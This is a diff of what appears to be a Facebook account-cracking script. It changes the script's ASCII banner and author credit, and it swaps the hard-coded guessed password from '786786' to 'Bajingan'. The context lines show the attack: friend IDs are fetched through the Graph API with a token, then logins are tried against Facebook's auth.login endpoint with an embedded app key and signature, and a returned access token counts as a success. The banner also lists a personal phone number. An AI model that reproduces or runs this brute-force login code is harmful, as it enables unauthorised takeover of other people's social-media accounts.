@@ -51,11 +51,11 @@ logo = """\033[1;93m█████████
 \033[1;93m█▄█████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
 \033[1;93m█\033[1;92m▼▼▼▼▼ \033[1;92m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
 \033[1;93m█ \033[1;92m \033[1;92m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
-\033[1;93m█\033[1;92m▲▲▲▲▲\033[1;92m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;96  DARKCYBER
-\033[1;93m█████████      \033[1;92m«----------✧----------»
+\033[1;93m█\033[1;92m▲▲▲▲▲\033[1;92m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;96  PASOPATI
+\033[1;93m█████████      \033[1;92m«----------KING ARJUNA----------»
 \033[1;93m ██ ██
 \033[1;93m╔════════════════════════════════════════════╗
-\033[1;93m║\033[1;96m* \033[1;93mAuthor  \033[1;93m : \033[1;93mArjuna•|Mr.ARJUNAWIWAHA\033[1;93m          ║
+\033[1;93m║\033[1;96m* \033[1;93mAuthor  \033[1;93m : \033[1;93mKING ARJUNA WIWAHA\033[1;93m             ║
 \033[1;93m║\033[1;96m* \033[1;93mGitHub  \033[1;93m : \033[1;93m\033[4mhttps://Github.com/Arjunawiwaha\033[0m \033[1;93m║
 \033[1;93m║\033[1;96m* \033[1;93mWhatsApp \033[1;93m: \033[1;93m0812-8044-0535\033[1;93m                 ║
 \033[1;93m╚════════════════════════════════════════════╝"""
@@ -304,7 +304,7 @@ def pilih_super():
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
-			pass1 = ('786786')
+			pass1 = ('Bajingan')
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
